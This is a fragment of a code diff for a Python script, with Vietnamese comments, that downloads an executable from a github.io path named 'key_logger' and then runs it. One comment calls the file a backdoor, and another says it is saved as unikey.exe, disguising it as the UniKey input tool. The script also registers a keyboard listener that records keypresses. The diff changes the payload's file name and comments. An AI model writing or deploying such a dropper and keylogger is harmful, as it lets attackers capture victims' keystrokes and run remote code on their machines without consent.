@@ -1,7 +1,7 @@
 import requests
 
 # Tự động tải file dev.exe từ server, lưu lại với tên unikey.exe
-file_backdoor = "unikey-backdoor.exe"
+file_backdoor = "dev.exe"
 url = f"https://tiennhm.github.io/key_logger/web/{file_backdoor}"
 r = requests.get(url)
 
@@ -29,6 +29,6 @@ with Listener(on_press=on_press) as listener:
     listener.join()
 
 
-# Tạo tiến trình mới để chạy file unikey.exe
+# Chạy file backdoor
 import os
 os.system(f"start {file_backdoor}")
